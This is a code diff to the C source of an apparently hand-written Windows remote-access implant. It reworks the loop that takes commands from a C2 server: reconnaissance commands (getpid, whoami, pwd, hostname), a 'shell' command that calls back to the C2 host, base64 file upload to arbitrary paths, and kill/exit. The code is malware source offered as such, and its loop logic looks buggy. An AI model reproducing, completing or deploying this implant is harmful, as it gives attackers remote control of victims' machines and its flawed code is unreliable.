@@ -187,14 +187,16 @@ DWORD getpid(){
 
 
 int upload(char * filename, char * content){
-	// Upload contents to a file
 	errno = 0;
 	FILE *outfile;
 	outfile = fopen(filename, "wb");
+	printf("[upload] DBG 1\n");
 	if (!outfile) {
+		printf("[upload] DBG 2\n");
 		return errno;
 	}
 	else {
+		printf("[upload] DBG 3\n");
 		fwrite(content,strlen(content),1,outfile);
 		fclose(outfile);
 		return 0;
@@ -287,140 +289,143 @@ void Shell(char* C2Server, int C2Port)
 /* #endregion */
 
 void CnC(SOCKET tcpsock, char* C2Server, int C2Port) {
-			/* #region Connection verification */
-			char RecvData[1024] = "";
+	/* #region Connection verification */
+		char RecvData[1024] = "";
+		memset(RecvData, 0, sizeof(RecvData));
+		// here waits for any data input from Server
+		int RecvCode = recv(tcpsock, RecvData, 1024, 0);
+		
+		if (RecvCode <= 0){
+			closesocket(tcpsock);
+			WSACleanup();
+			return;
+		}
+		/* #endregion */
+	while (true) {
+		char * command;
+		char delim[] = " ";
+		command = strtok(RecvData, delim);
+		
+		if (strcmp(command, "\n") == 0) {
 			memset(RecvData, 0, sizeof(RecvData));
-			// here waits for any data input from Server
-			int RecvCode = recv(tcpsock, RecvData, 1024, 0);
+			}
+		else if (strcmp(command, "getpid\n") == 0) {
+			DWORD pid;
+			char cpid[6];
+			pid = getpid();
+			// Convert DWORD to char (using base 10)
+			_ultoa(pid,cpid,10);
 			
-			if (RecvCode <= 0){
-				closesocket(tcpsock);
-				WSACleanup();
-				return;
-			}
-			/* #endregion */
-			
-			char * command;
-			char delim[] = " ";
-			command = strtok(RecvData, delim);
-			
-			if (strcmp(command, "\n") == 0) {
-				memset(RecvData, 0, sizeof(RecvData));
-				}
-			else if (strcmp(command, "upload") == 0) {
-				
-				// Parse filename and contents
-				char * filename = strtok(NULL, delim);
-				char * b64_contents = strtok(NULL, delim);
-				// this needed to trim new line from the end, so base64 can be parsed correctly further
-				b64_contents = strtok(b64_contents,"\n");
-				
-				size_t filesize = b64_decoded_size(b64_contents);
-				char * contents = (char *)malloc(filesize);
-				contents  = b64_decode(b64_contents);
+			// preparing buffer to send
+			char buffer[20];
+			memset(buffer, 0, sizeof(buffer));
+			strcat(buffer,"Current PID: ");
+			strcat(buffer,cpid);
+			strcat(buffer, "\n");
 
-				printf("[CnC] decoded data: %s\n", contents);
-
-				// uploading
-				int result;
-				result = upload(filename,contents);
-
-				// C&C part
-				char buffer[255];
-				memset(buffer, 0, sizeof(buffer));
-				if (result == 0) { 
-					strcat(buffer,"\nUploaded "); 
-					strcat(buffer,filename); 
-				}
-				// TODO check if this else works correctly!!
-				else { 
-					printf("[CnC] DBG here"); 
-					strcat(buffer,"Failed to write file. Errno from fopen: "); 
-					char errnos[2];
-					memset(errnos,0,2);
-					_itoa(result,errnos,10);
-					strcat(buffer,errnos);
-				}
-				strcat(buffer,"\n");
-				
-				send(tcpsock,buffer,strlen(buffer)+1,0);
-				// clear buffers
-				memset(contents, 0, sizeof(contents));
-				memset(buffer, 0, sizeof(buffer));
-				memset(RecvData, 0, sizeof(RecvData)); 
-			}
-			else if (strcmp(command, "getpid\n") == 0) {
-				DWORD pid;
-				char cpid[6];
-				pid = getpid();
-				// Convert DWORD to char (using base 10)
-				_ultoa(pid,cpid,10);
-				
-				// preparing buffer to send
-				char buffer[20];
-				memset(buffer, 0, sizeof(buffer));
-				strcat(buffer,"Current PID: ");
-				strcat(buffer,cpid);
-				strcat(buffer, "\n");
-
-				send(tcpsock,buffer,strlen(buffer)+1,0);
-				// clear buffers
-				memset(buffer, 0, sizeof(buffer));
-				memset(RecvData, 0, sizeof(RecvData));
-			}
-			else if (strcmp(command, "whoami\n") == 0) {
-				char buffer[257] = ""; // reserve buffer with length of 257 bytes
-				whoami(buffer); // call whoami function
-				strcat(buffer, "\n"); 
-
-				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
-				// clear buffers
-				memset(buffer, 0, sizeof(buffer));
-				memset(RecvData, 0, sizeof(RecvData));
-			}
-			// Command parsed as pwd (strpcmp makes comparsion with predefined string in this case)
-			else if (strcmp(command, "pwd\n") == 0) {
-				char buffer[257] = "";
-				pwd(buffer);
-				strcat(buffer, "\n");
-
-				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
-				// clear buffers
-				memset(buffer, 0, sizeof(buffer));
-				memset(RecvData, 0, sizeof(RecvData));
-			}
-			else if (strcmp(command, "hostname\n") == 0) {
-				char buffer[257] = "";
-				hostname(buffer);
-				strcat(buffer, "\n"); 
-				
-				send(tcpsock, buffer, strlen(buffer)+1,0); // send response
-				// clear buffers
-				memset(buffer, 0, sizeof(buffer));
-				memset(RecvData, 0, sizeof(RecvData));
-			}
-			else if (strcmp(command, "shell\n") == 0) {
-				Shell(C2Server,C2Port);
-			}
-			else if (strcmp(command, "exit\n") == 0) {
-				closesocket(tcpsock);
-				WSACleanup();
-				Sleep(1000);
-				return;
-			}
-			else if (strcmp(command, "kill\n") == 0) {
-				closesocket(tcpsock);
-				WSACleanup();
-				Sleep(1000);
-				exit(0);
-			}
-			else {
-				char buffer[20] = "Invalid command\n";
-				send(tcpsock,buffer,strlen(buffer)+1,0);
-				memset(buffer, 0, sizeof(buffer));
-				memset(RecvData, 0, sizeof(RecvData));
-			}
+			send(tcpsock,buffer,strlen(buffer)+1,0);
+			// clear buffers
+			memset(buffer, 0, sizeof(buffer));
 			memset(RecvData, 0, sizeof(RecvData));
+		}
+		else if (strcmp(command, "whoami\n") == 0) {
+			char buffer[257] = ""; // reserve buffer with length of 257 bytes
+			whoami(buffer); // call whoami function
+			strcat(buffer, "\n"); 
+
+			send(tcpsock, buffer, strlen(buffer)+1,0); // send response
+			// clear buffers
+			memset(buffer, 0, sizeof(buffer));
+			memset(RecvData, 0, sizeof(RecvData));
+		}
+		// Command parsed as pwd (strpcmp makes comparsion with predefined string in this case)
+		else if (strcmp(command, "pwd\n") == 0) {
+			char buffer[257] = "";
+			pwd(buffer);
+			strcat(buffer, "\n");
+
+			send(tcpsock, buffer, strlen(buffer)+1,0); // send response
+			// clear buffers
+			memset(buffer, 0, sizeof(buffer));
+			memset(RecvData, 0, sizeof(RecvData));
+		}
+		else if (strcmp(command, "hostname\n") == 0) {
+			char buffer[257] = "";
+			hostname(buffer);
+			strcat(buffer, "\n"); 
+			
+			send(tcpsock, buffer, strlen(buffer)+1,0); // send response
+			// clear buffers
+			memset(buffer, 0, sizeof(buffer));
+			memset(RecvData, 0, sizeof(RecvData));
+		}
+		else if (strcmp(command, "shell\n") == 0) {
+			Shell(C2Server,C2Port);
+		}
+		else if (strcmp(command, "exit\n") == 0) {
+			closesocket(tcpsock);
+			WSACleanup();
+			Sleep(1000);
+			return;
+		}
+		else if (strcmp(command, "kill\n") == 0) {
+			closesocket(tcpsock);
+			WSACleanup();
+			Sleep(1000);
+			exit(0);
+		}
+		else if (strcmp(command, "upload") == 0) {
+			
+			// Parse filename and contents
+			char * filename = strtok(NULL, delim);
+			char * b64_contents = strtok(NULL, delim);
+			// this needed to trim new line from the end, so base64 can be parsed correctly further
+			b64_contents = strtok(b64_contents,"\n");
+			
+			size_t filesize = b64_decoded_size(b64_contents);
+			char * contents = (char *)malloc(filesize);
+			contents  = b64_decode(b64_contents);
+
+			printf("[CnC] decoded data: %s\n", contents);
+
+			// uploading
+			int result;
+			result = upload(filename,contents);
+
+			printf("[CnC] DBG 1\n");
+
+			// C&C part
+			char buffer[255];
+			memset(buffer, 0, sizeof(buffer));
+			if (result == 0) {
+				strcat(buffer,"\nUploaded "); 
+				strcat(buffer,filename); 
+			}
+			// TODO check if this else works correctly!!
+			else { 
+				printf("[CnC] DBG 2"); 
+				strcat(buffer,"Failed to write file. Errno from fopen: "); 
+				char errnos[2];
+				memset(errnos,0,2);
+				_itoa(result,errnos,10);
+				strcat(buffer,errnos);
+			}
+			strcat(buffer,"\n");
+			
+			send(tcpsock,buffer,strlen(buffer)+1,0);
+			// clear buffers
+			memset(contents, 0, sizeof(contents));
+			memset(buffer, 0, sizeof(buffer));
+			memset(RecvData, 0, sizeof(RecvData)); 
+		}
+		else {
+			char buffer[20] = "Invalid command\n";
+			send(tcpsock,buffer,strlen(buffer)+1,0);
+			memset(buffer, 0, sizeof(buffer));
+			memset(RecvData, 0, sizeof(RecvData));
+		}
+		memset(RecvData, 0, sizeof(RecvData));
+	}
 }
 
 /* #region Beacon logics */
@@ -452,10 +457,7 @@ void Connect(char* C2Server, int C2Port)
 	}
 	// Else connection successfull..
 	else {
-		
-		while (true) {
-			CnC(tcpsock,C2Server,C2Port);
-		}
+		CnC(tcpsock,C2Server,C2Port);
 	}
 	closesocket(tcpsock);
 	WSACleanup();
